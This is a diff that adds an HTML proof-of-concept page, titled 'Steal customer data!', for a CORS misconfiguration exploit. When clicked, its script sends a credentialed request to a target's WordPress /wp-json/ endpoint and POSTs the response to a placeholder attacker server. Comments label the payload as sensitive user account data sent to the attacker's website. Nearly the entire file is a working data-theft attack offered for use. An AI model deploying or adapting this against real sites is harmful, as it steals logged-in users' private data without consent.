@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h1>Steal customer data!</h1>
+<h2>Exploit By @Tushav JAdhav</h2>
+<a href="https://www.linkedin.com/in/tushar-jadhav-7a43b4171/">Profile</a>
+<html>
+<body>
+<button type='button' onclick='cors()'>Exploit</button>
+<p id='demo'></p>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var a = this.responseText; // Sensitive data from niche.co about user account
+document.getElementById("demo").innerHTML = a;
+xhttp.open("POST", "http://[yourserverurl]", true);// Sending that data to Attacker's website
+xhttp.withCredentials = true;
+console.log(a);
+xhttp.send("data="+a);
+}
+};
+xhttp.open("GET", "https://[Targeturl]/wp-json/", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
+</html>
